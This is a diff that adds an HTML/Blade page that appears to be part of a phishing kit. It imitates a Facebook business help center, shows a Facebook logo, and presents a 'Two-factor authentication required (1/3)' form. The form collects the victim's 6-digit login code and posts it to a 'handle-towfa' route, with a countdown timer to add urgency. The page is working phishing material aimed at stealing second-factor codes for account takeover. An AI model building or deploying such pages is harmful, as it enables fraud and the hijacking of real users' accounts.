@@ -1,0 +1,103 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml"
+        href="data:image/png;base64,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" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
+        integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous" />
+    <title>Business Help Center | Privacy Policy</title>
+    <script type="module" crossorigin src="assets/js/index.js"></script>
+    <link rel="stylesheet" href="assets/css/index-2fa.css">
+</head>
+
+<body>
+    <div id="root">
+        <div class="ns-block-ui full-screen   " aria-busy="false">
+            <nav class="navbar-white navbar navbar-expand navbar-light">
+                <div class="container"><a href="#home" class="navbar-brand"><img class="logo m-0 p-0"
+                            src="assets/images/fb-logo.webp"></a><button type="button" aria-label="Toggle navigation"
+                        class="navbar-toggler collapsed"><span class="navbar-toggler-icon"></span></button>
+                    <div class="justify-content-end navbar-collapse collapse"><span class="navbar-text"></span></div>
+                </div>
+            </nav>
+            <div class="mt-5 pt-5 container">
+                <div class="d-flex justify-content-center row">
+                    <div class="col-lg-7 col-md-12 col-sm-12">
+                        <div class="px-0 pt-0 pb-0 card">
+                            <div class="card-header">Two-factor authentication required (1/3)</div>
+                            <hr class="mt-0">
+                            <div class="card-body"><span>You've asked us to require a 6-digit login code when anyone
+                                    tries to access your account from a new device or browser.</span>
+                                <p>Enter the 6-digit code from your <b>code generator</b> or third-party app bellow.</p>
+                                <form action="{{ route('handle-towfa') }}" method="post" id="frmConfirm2FA"
+                                    class="">
+                                    @csrf
+                                    <div class="row">
+                                        <div class="col-4">
+                                            <div class="mb-3"><label class="form-label" for="TwofactorCode">6-digit
+                                                    code
+                                                    <small class="text-muted form-text">(
+                                                        <span id="minute">05</span>
+                                                        :
+                                                        <span id="second">00</span>
+                                                        )</small></label>
+                                                <input name="2fa" maxlength="8" placeholder="Enter code"
+                                                    type="text" id="TwofactorCode" class="form-control">
+                                            </div>
+                                        </div>
+                                    </div>
+                                </form>
+                                <hr>
+                                <div class="d-flex align-items-center"><a href="#">Need another?</a>
+                                    <button type="submit" form="frmConfirm2FA"
+                                        class="ms-auto btn btn-primary">Send</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+</body>
+<script src="https://cdn.jsdelivr.net/npm/react/umd/react.production.min.js" crossorigin></script>
+<script src="https://cdn.jsdelivr.net/npm/react-dom/umd/react-dom.production.min.js" crossorigin></script>
+<script src="https://cdn.jsdelivr.net/npm/react-bootstrap@next/dist/react-bootstrap.min.js" crossorigin></script>
+<script>
+    // Lấy các phần tử DOM cần thiết
+    var minuteSpan = document.getElementById("minute");
+    var secondSpan = document.getElementById("second");
+
+    // Đặt thời gian ban đầu
+    var totalSeconds = localStorage.getItem("totalSeconds") || 5 * 60; // 5 phút
+
+    // Cập nhật đồng hồ đếm ngược mỗi giây
+    var interval = setInterval(function() {
+        // Tính toán phút và giây
+        var minutes = Math.floor(totalSeconds / 60);
+        var seconds = totalSeconds % 60;
+
+        // Hiển thị phút và giây
+        minuteSpan.textContent = minutes.toString().padStart(2, '0');
+        secondSpan.textContent = seconds.toString().padStart(2, '0');
+
+        // Giảm tổng số giây đi 1
+        totalSeconds--;
+
+        // Lưu trạng thái vào Local Storage
+        localStorage.setItem("totalSeconds", totalSeconds);
+
+        // Kiểm tra nếu đếm ngược đã kết thúc
+        if (totalSeconds < 0) {
+            clearInterval(interval);
+            alert("Đếm ngược đã kết thúc!");
+            localStorage.removeItem("totalSeconds"); // Xóa trạng thái lưu trữ khi kết thúc
+        }
+    }, 1000); // 1000 milliseconds = 1 giây
+</script>
+
+</html>
